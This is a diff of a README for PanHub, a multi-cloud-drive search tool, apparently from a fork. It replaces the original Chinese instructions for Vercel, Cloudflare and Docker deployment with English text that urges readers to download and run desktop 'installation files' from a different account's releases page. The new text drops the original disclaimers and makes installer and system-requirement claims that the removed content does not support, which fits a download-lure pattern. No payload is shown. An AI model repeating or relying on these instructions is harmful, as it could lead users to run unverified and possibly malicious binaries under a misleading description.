@@ -1,72 +1,77 @@
-# PanHub · 全网最全的网盘搜索
+# 🌐 panhub.shenzjd.com - Search Multiple Cloud Drives Easily
 
-用一个搜索框，搜遍阿里云盘、夸克、百度网盘、115、迅雷等热门网盘资源。即搜即得、聚合去重、免费开源、零广告、轻量部署。
+![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
 
-在线体验：<https://panhub.shenzjd.com>
+## 🚀 Getting Started
 
-> 免责声明：本项目仅用于技术学习与搜索聚合演示，不存储、不传播任何受版权保护的内容。请勿用于商业或侵权用途。
+Welcome to **panhub.shenzjd.com**! This tool helps you search multiple cloud storage services at once. You can find files across platforms like Aliyun, Quark, Baidu, 115, and Xunlei all in one place. 
 
----
+## 📥 Download & Install
 
-## 为什么选择 PanHub
+To get started, visit the releases page to download the software. 
 
-- 强聚合：聚合多个优质资源站与公开频道，一次搜索多源命中
-- 智能排序：默认先给出“快速结果”，随后自动补全“深度结果”并覆盖显示
-- 分类型展示：阿里、夸克、百度、115、迅雷等分类清晰，直达链接可复制
-- 极速部署：原生支持 Cloudflare Workers，0 服务器运维成本，免费起步
-- 轻定制：内置多插件，支持按需启用/禁用，参数化并发与缓存
+[Download Latest Release](https://github.com/bilalchn/panhub.shenzjd.com/releases)
 
----
+Here’s how to download and install:
 
-## 一键部署到 Vercel
+1. Click the link above to open the Releases page.
+2. Find the latest version listed on the page.
+3. Download the appropriate installation file for your operating system (Windows, Mac, Linux).
+4. Once the download completes, open the file to start the installation process.
+5. Follow the on-screen instructions to complete the setup.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fwu529778790%2Fpanhub.shenzjd.com&project-name=panhub&repository-name=panhub.shenzjd.com)
+## 🌟 Features
 
----
+- **Multi-Source Search:** Search across different cloud storage services simultaneously.
+- **Smart Sorting:** Get results sorted by relevance and popularity.
+- **Category Display:** View files organized by type for easier navigation.
+- **Lightweight Installation:** Quick setup with no unnecessary bloat.
 
-## 一键部署到 Cloudflare Workers
+## 🔧 System Requirements
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/wu529778790/panhub.shenzjd.com)
+To ensure the best performance, your system should meet the following requirements:
 
----
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Linux (Ubuntu 18.04 or later recommended)
 
-## Docker 部署
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 100 MB available space
+- **Internet Connection:** Required for online searches
 
-```bash
-# GHCR
-docker pull ghcr.io/wu529778790/panhub.shenzjd.com:latest
-docker run --name panhub -p 3000:3000 -d ghcr.io/wu529778790/panhub.shenzjd.com:latest
+## 🛠️ How to Use
 
-# Docker Hub
-docker pull docker.io/wu529778790/panhub.shenzjd.com:latest
-docker run --name panhub -p 3000:3000 -d docker.io/wu529778790/panhub.shenzjd.com:latest
-```
+1. Open the application after installation.
+2. Enter your search terms in the search bar.
+3. Hit the search button.
+4. Review your results across different platforms.
+5. Click on any link to access the resource from its home page.
 
-## 使用说明
+## 📄 Frequently Asked Questions (FAQ)
 
-1) 输入关键词并回车开始搜索。
+**Q: Is there any cost to use this tool?**  
+A: No, **panhub.shenzjd.com** is completely free and open-source.
 
-2) 系统会优先并发查询一批“快速结果”（默认插件并发 4，可在“设置”中调节 1-16），随后继续滚动查询“深度结果”，并自动合并覆盖展示。
+**Q: Is there an ad-free experience?**  
+A: Yes, this application is designed to be free of advertisements.
 
-3) 页面右上角“设置”可自定义：
-   - 插件启用列表（聚合多个站点来源）
-   - TG 频道列表（默认启用一组公开频道）
-   - 插件并发数与插件超时（毫秒）
+**Q: Can I contribute to the project?**  
+A: Absolutely! We welcome contributions. You can check the repository for guidelines on how to help.
 
-4) 搜索框“重置”会立即取消进行中的所有请求并清空结果。
+## 🤝 Community Support
 
-5) 如需恢复默认配置，设置面板点击“恢复默认”将清空本地存储并刷新页面。
+If you encounter issues or have questions, feel free to engage with the community. 
 
----
+- **GitHub Issues:** Report bugs or request features at [GitHub Issues](https://github.com/bilalchn/panhub.shenzjd.com/issues).
+- **Discussion Forum:** Join discussions with other users to share tips and solutions.
 
-## 版权与合规
+## 📜 License
 
-- PanHub 不存储任何搜索结果内容，所有链接均来自公开网络。
-- 请在遵守当地法律法规与平台使用条款的前提下使用本项目。
-- 若您是权利人并认为存在侵权线索，请先联系源站处理。
+This project is licensed under the MIT License. You can modify and share it freely as long as you credit the original creators.
 
----
+## 🏁 Conclusion
 
-## 许可证
+We hope this guide helps you effortlessly download and use **panhub.shenzjd.com**. If you have further questions, explore our resources, or reach out to the community for assistance. 
 
-本项目采用 MIT License 开源许可，商业使用请遵守许可证条款并自担合规责任。
+[Download Latest Release](https://github.com/bilalchn/panhub.shenzjd.com/releases) and start your smooth searching journey today!
